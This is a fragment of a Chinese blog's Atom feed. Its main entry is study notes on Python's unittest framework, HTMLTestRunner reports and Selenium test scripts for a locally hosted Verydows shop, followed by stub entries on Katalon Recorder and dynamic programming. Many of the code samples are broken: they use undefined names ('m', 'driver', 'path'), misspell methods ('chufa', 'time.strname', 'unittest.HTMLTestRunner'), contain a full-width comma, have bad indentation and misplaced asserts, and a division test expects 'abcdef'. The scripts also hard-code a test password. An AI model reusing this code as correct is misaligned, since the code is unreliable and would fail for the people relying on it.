    <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613147342997.png" alt></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613147496034.png" alt></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613149415607.png" alt></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613149552674.png" alt></p><h4 id="多条测试用例"><a href="#多条测试用例" class="headerlink" title="多条测试用例"></a>多条测试用例</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613149845499.png" alt></p><h4 id="注解方法"><a href="#注解方法" class="headerlink" title="注解方法"></a>注解方法</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613199579426.png" alt="1613199579426"></p><h4 id="五个方法"><a href="#五个方法" class="headerlink" title="五个方法"></a>五个方法</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613199693463.png" alt="1613199693463"></p><h4 id="测试用例testcase"><a href="#测试用例testcase" class="headerlink" title="测试用例testcase"></a>测试用例testcase</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613201703588.png" alt="1613201703588"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613202112317.png" alt="1613202112317"></p><h4 id="测试集合testsuite"><a href="#测试集合testsuite" class="headerlink" title="测试集合testsuite"></a>测试集合testsuite</h4><h5 id="追加单个测试对象"><a href="#追加单个测试对象" class="headerlink" title="追加单个测试对象"></a>追加单个测试对象</h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613207825662.png" alt="1613207825662"></p><blockquote><p>print(re.__dict__)</p></blockquote><h5 id="追加多个测试对象"><a href="#追加多个测试对象" class="headerlink" title="追加多个测试对象"></a>追加多个测试对象</h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613209390861.png" alt="1613209390861"></p><h4 id="TestLoder"><a href="#TestLoder" class="headerlink" title="TestLoder"></a>TestLoder</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613231860846.png" alt="1613231860846"></p><p>第一个参数path：指定存放测试用例的目录（单元测试用例，用unittest框架写的测试用例）</p><p>第二个参数pattern：指定匹配规则</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613233980464.png" alt="1613233980464"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613234000816.png" alt="1613234000816"></p><h4 id="TestRunner"><a href="#TestRunner" class="headerlink" title="TestRunner"></a>TestRunner</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613318481043.png" alt="1613318481043"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613319975732.png" alt="1613319975732"></p><h5 id="状态1"><a href="#状态1" class="headerlink" title="状态1"></a>状态1</h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613320910898.png" alt="1613320910898"></p><h5 id="状态2（大于1即可）详细报告"><a href="#状态2（大于1即可）详细报告" class="headerlink" title="状态2（大于1即可）详细报告"></a>状态2（大于1即可）详细报告</h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613320887518.png" alt="1613320887518"></p><h5 id><a href="#" class="headerlink" title></a><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613321695363.png" alt="1613321695363"></h5><h5 id="断言"><a href="#断言" class="headerlink" title="断言"></a>断言</h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613382483121.png" alt="1613382483121"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mymath</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">jia</span><span class="params">(self,a,b)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> a+b;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">jian</span><span class="params">(self,a,b)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> a-b</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">changfa</span><span class="params">(self,a,b)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> b==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> a/b</span><br><span class="line"></span><br><span class="line"><span class="comment">#代码功能验证</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    mm = mymath()</span><br><span class="line">    actualValue = m.jia(<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line">    expectValue = <span class="number">5</span></span><br><span class="line">    <span class="keyword">if</span> actualValue==expectValue:</span><br><span class="line">        print(<span class="string">"加法功能实现正确"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        actualValue==mm.jia(<span class="string">"a"</span>,<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">"该方法功能实现正确"</span>，e)</span><br><span class="line">-----------------------------------------------------------</span><br><span class="line"><span class="comment">#导包</span></span><br><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"><span class="keyword">from</span> myMath <span class="keyword">import</span> mymath</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建单元测试类(继承自unittest.testcase)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myMathTest</span><span class="params">(unittest.TestCase)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#测试用例资源初始化方法</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setUp</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.mm = mymath()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#测试用例方法</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_add_1</span><span class="params">(self)</span>:</span></span><br><span class="line">        actualValue = self.mm.jia(<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">        expectValue = <span class="number">3</span></span><br><span class="line">        <span class="comment">#断言</span></span><br><span class="line">        self.assertEqual(actualValue,expectValue,<span class="string">"预期结果不一致"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_add_2</span><span class="params">(self)</span>:</span></span><br><span class="line">        actualValue = self.mm.jia(<span class="string">"abc"</span>,<span class="string">"def"</span>)</span><br><span class="line">        expectValue = <span class="string">"abcdef"</span></span><br><span class="line">        self.assertEqual(actualValue,expectValue,<span class="string">"预期结果不一致"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_floor_1</span><span class="params">(self)</span>:</span></span><br><span class="line">        actualValue = self.mm.chufa(<span class="number">4</span>,<span class="number">0</span>)</span><br><span class="line">        expectValue = <span class="string">"abcdef"</span></span><br><span class="line">        self.assertEqual(actualValue,expectValue,<span class="string">"预期结果不一致"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#测试用例的资源释放</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tearDown</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment">#unittest.main()</span></span><br><span class="line">    <span class="comment">#直接使用discover</span></span><br><span class="line">    discover=unittest.defaultTestLoader.discover(<span class="string">r"./20200408/"</span>,pattern=<span class="string">"myMathTest.py"</span>)</span><br><span class="line">    <span class="comment">#使用runner运行器运行测试集  "a"追加模式</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">r"./20200408/re.txt"</span>,<span class="string">"a"</span>,encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        runner=unittest.TextTestRunner(f,description=<span class="string">"用于测试math类的用例执行"</span>,verbosity=<span class="number">2</span>)</span><br><span class="line">        runner.run(discover)</span><br></pre></td></tr></table></figure><p>maintest.py</p><blockquote><p>主测试文件,不是用来写测试用的,而是用来组织测试用来执行的</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613396353835.png" alt="1613396353835"></p><h3 id="HTML测试文档"><a href="#HTML测试文档" class="headerlink" title="HTML测试文档"></a>HTML测试文档</h3><h5 id="HTMLTestRunner模块"><a href="#HTMLTestRunner模块" class="headerlink" title="HTMLTestRunner模块"></a>HTMLTestRunner模块</h5><p>安装HTMLTestRunner.py到python的安装目录下/lib中</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install html-TestRunner</span><br></pre></td></tr></table></figure><h5 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> HTMLTestRunner <span class="keyword">import</span> HTMLTestRunner</span><br><span class="line"></span><br><span class="line"><span class="comment">#path=os.path.dirname(__file__)当前目录</span></span><br><span class="line">path=os.path.dirname(__file__)+<span class="string">r"/"</span></span><br><span class="line">filename=time.strname(<span class="string">"%Y-%m-%d-%H-%M-%S"</span>) + <span class="string">r".html"</span></span><br><span class="line">filename = path + filename</span><br><span class="line"><span class="comment">#修改代码</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">r"./20200408/result.html"</span>,<span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">runner=unittest.HTMLTestRunner(f,verbosity=<span class="number">2</span>,title=<span class="string">"单元测试报告"</span>,description=<span class="string">"第一次运行的结果"</span>)</span><br><span class="line">runner.run(discover)</span><br></pre></td></tr></table></figure><p>注释</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613572049278.png" alt="1613572049278"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613572027235.png" alt="1613572027235"></p><h3 id="邮件自动化"><a href="#邮件自动化" class="headerlink" title="邮件自动化"></a>邮件自动化</h3><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613574779605.png" alt="1613574779605"></p><h3 id="项目"><a href="#项目" class="headerlink" title="项目"></a>项目</h3><p>项目目录结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---public(模块,例如注册,登录,退出)</span><br><span class="line">---test_cases(测试用例)</span><br><span class="line">---test_datas(测试数据,例如csv文件)</span><br><span class="line">---test_report(测试报告)</span><br></pre></td></tr></table></figure><p>电商系统/public/loginModule.py</p><blockquote><p>登录模块</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.action_chains <span class="keyword">import</span> ActionChains</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">very_login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self,driver)</span>:</span></span><br><span class="line">        self.driver=driver</span><br><span class="line">        self.driver.implicitly_wait(<span class="number">10</span>)</span><br><span class="line">        self.driver.get(<span class="string">"http://localhost/verydows/"</span>)</span><br><span class="line">        <span class="comment">#点击登录</span></span><br><span class="line">        self.driver.find_element_by_link_text(<span class="string">"登录"</span>).click()</span><br><span class="line">        <span class="comment">#输入用户名密码</span></span><br><span class="line">        self.driver.find_element_by_xpath(<span class="string">'//*[@id="username"]'</span>).send_keys(<span class="string">"kayleh"</span>)</span><br><span class="line">        self.driver.find_element_by_xpath(<span class="string">'//*[@id="password"]'</span>).send_keys(<span class="string">"123456"</span>)</span><br><span class="line">        <span class="comment">#点击登录按钮</span></span><br><span class="line">        self.driver.find_element_by_xpath(<span class="string">'//*[@id="login-form"]/div/a'</span>).click()</span><br><span class="line">        time.sleep(<span class="number">5</span>)</span><br><span class="line">       </span><br><span class="line">    <span class="comment">#退出登录</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">(self,driver)</span>:</span></span><br><span class="line">        self.driver=driver</span><br><span class="line">        ele=self.driver.find_element_by_xpath(<span class="string">'//*[@id="top-userbar"]/a'</span>)</span><br><span class="line">        ActionChains(self.driver).move_to_element(ele).perform()</span><br><span class="line">        self.driver.find_element_by_link_text(<span class="string">"退出"</span>).click()</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#退出浏览器对象</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">quitB</span><span class="params">(self,driver)</span>:</span></span><br><span class="line">        self.driver=driver</span><br><span class="line">        self.driver.quit()</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    driver=webdriver.Chrome()</span><br></pre></td></tr></table></figure><p>电商系统/testcases/verydows_user_update.py</p><blockquote><p>更新用户信息</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment">#os.path.dirname(os.path.dirname(__file__))是这个文件的目录的上一级目录(电商系统)</span></span><br><span class="line">path=os.path.dirname(os.path.dirname(__file__))+<span class="string">r"/public"</span></span><br><span class="line"><span class="comment">#添加到环境变量</span></span><br><span class="line">path1=sys.path</span><br><span class="line">path1.append(path)</span><br><span class="line"><span class="keyword">from</span> loginModule <span class="keyword">import</span> very_login</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">verydows_user_update</span><span class="params">(unittest.TestCase)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setUp</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.ll = very_login()</span><br><span class="line">        self.driver=webdriver.Chrome()</span><br><span class="line">        self.ll.login(self.driver)</span><br><span class="line">       </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_user_01</span><span class="params">(self)</span>:</span></span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line">        self.driver.find_element_by_xpath(<span class="string">''</span>).click()</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        self.driver.find_element_by_xpath(<span class="string">''</span>).clear()</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        self.driver.find_element_by_xpath(<span class="string">''</span>).send_keys(<span class="string">"petter"</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">        self.driver.find_element_by_xpath(<span class="string">''</span>).clear()</span><br><span class="line">        time.sleep(<span class="number">5</span>)</span><br><span class="line">        <span class="comment">#修改完验证</span></span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tearDown</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.ll.logout(self.driver)</span><br><span class="line">        self.ll.quitB(self.driver)</span><br><span class="line">    actualValue=self.driver.find_element_by_xpath(<span class="string">''</span>).get_attribute(<span class="string">"value"</span>)</span><br><span class="line">        expectValue=<span class="string">"peter"</span></span><br><span class="line">        self.assertEqual(actualValue,expectValue)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    unittest.main()</span><br></pre></td></tr></table></figure><p>电商系统/testcases/verydows_reg_true.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">filename = os.path.dirname(os.path.dirname(__file__))+<span class="string">r"/test_datas/data_csv.csv"</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">verydows_reg_true</span><span class="params">(unittest.TestCase)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setUp</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_reg_01</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">with</span> open(filename,<span class="string">"r"</span>,encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data=csv.reader(f)</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">                driver.get(<span class="string">"http://localhost/verydows/"</span>)</span><br><span class="line">                driver.find_element_by_link_text(<span class="string">"免费注册"</span>).click()</span><br><span class="line">                driver.find_element_by_id(<span class="string">"username"</span>).send_keys(d[<span class="number">0</span>])</span><br><span class="line">                driver.find_element_by_id(<span class="string">"email"</span>).send_keys(d[<span class="number">1</span>])</span><br><span class="line">                driver.find_element_by_id(<span class="string">"password"</span>).send_keys(d[<span class="number">2</span>])</span><br><span class="line">                driver.find_element_by_id(<span class="string">"repassword"</span>).send_keys(d[<span class="number">3</span>])</span><br><span class="line">                driver.find_element_by_link_text(<span class="string">"立即注册"</span>).click()</span><br><span class="line">                </span><br><span class="line">                <span class="comment">#因为有一个中间页面的跳转，此处要强制等待一下，让他跳转过去</span></span><br><span class="line">                time.sleep(<span class="number">2</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="comment">#断言</span></span><br><span class="line">                <span class="comment">#expectUrl="http://localhost/verydows/index.php?c=user&amp;a=index"</span></span><br><span class="line">                <span class="comment">#actualUrl=driver.current_url</span></span><br><span class="line">                </span><br><span class="line">                expectValue=d[<span class="number">4</span>]</span><br><span class="line">                actualValue=driver.find_element_by_xpath(<span class="string">'//....'</span>).text()</span><br><span class="line">                </span><br><span class="line">                <span class="comment">#if expectValue==actualValue:</span></span><br><span class="line"><span class="comment">#print("注册username反向测试用例通过")</span></span><br><span class="line">                <span class="comment">#else:</span></span><br><span class="line">                <span class="comment">#    print("注册username反向用例不通过")</span></span><br><span class="line">                self.assertEqual(expectValue,actualValue)</span><br><span class="line">                </span><br><span class="line">                <span class="comment">#关闭浏览器对象</span></span><br><span class="line">                driver.quit()</span><br><span class="line">               </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tearDown</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    unittest.main()</span><br></pre></td></tr></table></figure><p>电商系统/maintest.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在此文件中调度测试用例执行</span></span><br><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"><span class="keyword">from</span> HTMLTestRunner <span class="keyword">import</span> HTMLTestRunner</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"></span><br><span class="line">pathCase=os.path.dirname(__file__)+<span class="string">r"/test_cases/"</span></span><br><span class="line">pathReport=os.path.dirname(__file__)+<span class="string">r"/test_cases/"</span></span><br><span class="line"></span><br><span class="line">filename=time.strname(<span class="string">"%Y-%m-%d-%H-%M-%S"</span>) + <span class="string">r".html"</span></span><br><span class="line">filename=pathReport+filename</span><br><span class="line">discover = unittest.defaultTestLoader.discover(path,pattern=<span class="string">r"verydows*.py"</span>) </span><br><span class="line"><span class="keyword">with</span> open(filename,<span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">runner=unittest.HTMLTestRunner(f,verbosity=<span class="number">2</span>,title=<span class="string">"自动化测试用例报告"</span>,description=<span class="string">"XX"</span>)</span><br><span class="line">runner.run(discover)</span><br></pre></td></tr></table></figure><h2 id="Unittest下的数据驱动测试"><a href="#Unittest下的数据驱动测试" class="headerlink" title="Unittest下的数据驱动测试"></a>Unittest下的数据驱动测试</h2><p>数据存储</p><blockquote><p>测试脚本与测试数据分离</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613756103321.png" alt="1613756103321"></p><p>不导入ddt模块，字典只会形成一条测试用例</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613756685341.png" alt="1613756685341"></p><p> <img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613756748533.png" alt="1613756748533"></p><h4 id="excel"><a href="#excel" class="headerlink" title="excel"></a>excel</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613756844713.png" alt="1613756844713"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613756873832.png" alt="1613756873832"></p><p>xldr</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613757056609.png" alt="1613757056609"></p><p>excelutil.py</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613757120441.png" alt="1613757120441" style="zoom:67%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613757139743.png" alt="1613757139743" style="zoom:80%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613757341191.png" alt="1613757341191"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613147342997.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/
      
    
    </summary>
    
    
    
      <category term="test" scheme="https://kayleh.top/tags/test/"/>
    
  </entry>
  
  <entry>
    <title>Katalon Recorder (Selenium tests generator)</title>
    <link href="https://kayleh.top/katalon/"/>
    <id>https://kayleh.top/katalon/</id>
    <published>2021-02-01T10:42:57.000Z</published>
    <updated>2021-04-11T17:11:28.506Z</updated>
    
    <content type="html"><![CDATA[<p>和Selenium IDE类似的工具</p><h4 id="Katalon-Recorder-Selenium-tests-generator"><a href="#Katalon-Recorder-Selenium-tests-generator" class="headerlink" title="Katalon Recorder (Selenium tests generator)"></a>Katalon Recorder (Selenium tests generator)</h4>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;和Selenium IDE类似的工具&lt;/p&gt;
&lt;h4 id=&quot;Katalon-Recorder-Selenium-tests-generator&quot;&gt;&lt;a href=&quot;#Katalon-Recorder-Selenium-tests-generator&quot; class=&quot;hea
      
    
    </summary>
    
    
    
      <category term="test" scheme="https://kayleh.top/tags/test/"/>
    
  </entry>
  
  <entry>
    <title>Dynamic programming动态规划</title>
    <link href="https://kayleh.top/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
    <id>https://kayleh.top/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/</id>
    <published>2021-01-31T10:54:04.000Z</published>
    <updated>2021-04-11T17:11:28.769Z</updated>
    
